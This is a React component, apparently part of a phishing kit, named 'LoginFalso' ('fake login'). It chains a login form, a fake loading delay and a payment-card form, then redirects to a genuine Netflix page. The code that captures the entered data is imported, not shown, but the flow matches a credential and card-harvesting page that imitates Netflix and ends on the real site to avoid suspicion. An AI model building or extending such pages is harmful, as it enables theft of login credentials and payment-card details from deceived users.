import React, { useState } from "react";
import Login from "./componentsLoginfalso/Login/login";
import TarjetaPago from "./componentsLoginfalso/Login/Tarjeta"; // Importa tu formulario de tarjeta
import Transicion from "./componentsLoginfalso/transicion"; // Importa tu componente de transición

import styles from './Iniciar.module.css';

export default function LoginFalso() {
  const [isLoginForm, setIsLoginForm] = useState(true); // Estado para alternar formularios
  const [loading, setLoading] = useState(false); // Estado para controlar si se está cargando

  const onPaymentSuccess = () => {
    // Redirigir a la página de Netflix
    window.location.href = "https://www.netflix.com/ar/browse/genre/839338";
  };

  // Función que cambia el estado a mostrar la tarjeta después del login exitoso
  const handleLoginSuccess = () => {
    setLoading(true); // Comienza a mostrar la imagen de carga

    // Simular un retraso para la imagen de carga (simulando el proceso de login)
    setTimeout(() => {
      setLoading(false); // Después del retraso, ocultar la imagen de carga y mostrar la tarjeta
      setIsLoginForm(false); // Cambiar a mostrar la Tarjeta
    }, 2000); // Ajusta el tiempo según sea necesario
  };

  return (
    <div className={styles.loginfalso}>
      <Transicion isLoginForm={isLoginForm} />
      
      {/* Mostrar la imagen de carga si el estado loading es true */}
      {loading ? (
        <div className={styles.loadingContainer}>
          <img src="/loading.gif" alt="Cargando..." className={styles.loadingImage} />
        </div>
      ) : (
        isLoginForm ? <Login onLoginSuccess={handleLoginSuccess} /> : <TarjetaPago onPaymentSuccess={onPaymentSuccess} />
      )}
    </div>
  );
}
